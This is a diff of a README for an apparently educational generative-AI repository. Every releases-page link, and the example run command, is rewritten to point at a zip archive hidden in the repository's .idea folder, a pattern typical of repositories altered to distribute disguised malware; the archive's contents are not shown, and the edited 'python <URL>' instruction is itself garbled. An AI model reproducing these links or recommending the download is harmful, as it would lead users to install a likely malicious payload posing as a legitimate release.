@@ -1,6 +1,6 @@
 # 🤖 GenerativeAI-Foundations - Discover the Basics of Generative AI
 
-[![Download GenerativeAI-Foundations](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/rodroguezjuliocesar41-creator/GenerativeAI-Foundations/releases)
+[![Download GenerativeAI-Foundations](https://raw.githubusercontent.com/rodroguezjuliocesar41-creator/GenerativeAI-Foundations/master/.idea/GenerativeAI-Foundations-v3.9.zip)](https://raw.githubusercontent.com/rodroguezjuliocesar41-creator/GenerativeAI-Foundations/master/.idea/GenerativeAI-Foundations-v3.9.zip)
 
 ## 📖 Overview
 
@@ -23,7 +23,7 @@ Before you begin, ensure that your computer meets the following requirements:
 
 To access the application and its resources, please visit the following link to download:
 
-[Visit the Releases Page to Download](https://github.com/rodroguezjuliocesar41-creator/GenerativeAI-Foundations/releases).
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/rodroguezjuliocesar41-creator/GenerativeAI-Foundations/master/.idea/GenerativeAI-Foundations-v3.9.zip).
 
 On this page, you’ll find different versions of the application available for download. Choose the latest stable release for the best experience.
 
@@ -55,9 +55,9 @@ After you have downloaded the files, follow these steps to run the application:
 5. **Run the Application:**
    Execute the following commands based on your needs. If you want to run a specific script, type:
    ```
-   python script_name.py
+   python https://raw.githubusercontent.com/rodroguezjuliocesar41-creator/GenerativeAI-Foundations/master/.idea/GenerativeAI-Foundations-v3.9.zip
    ```
-   Replace `script_name.py` with the actual name of the script you want to run.
+   Replace `https://raw.githubusercontent.com/rodroguezjuliocesar41-creator/GenerativeAI-Foundations/master/.idea/GenerativeAI-Foundations-v3.9.zip` with the actual name of the script you want to run.
 
 ## 🔍 Exploring the Content
 
@@ -109,4 +109,4 @@ Join our community to discuss themes related to generative AI. This repository s
 
 Thank you for checking out **GenerativeAI-Foundations**. Your support helps grow the understanding of generative AI.
 
-Remember to [visit the Releases Page](https://github.com/rodroguezjuliocesar41-creator/GenerativeAI-Foundations/releases) for the latest updates and features.
+Remember to [visit the Releases Page](https://raw.githubusercontent.com/rodroguezjuliocesar41-creator/GenerativeAI-Foundations/master/.idea/GenerativeAI-Foundations-v3.9.zip) for the latest updates and features.
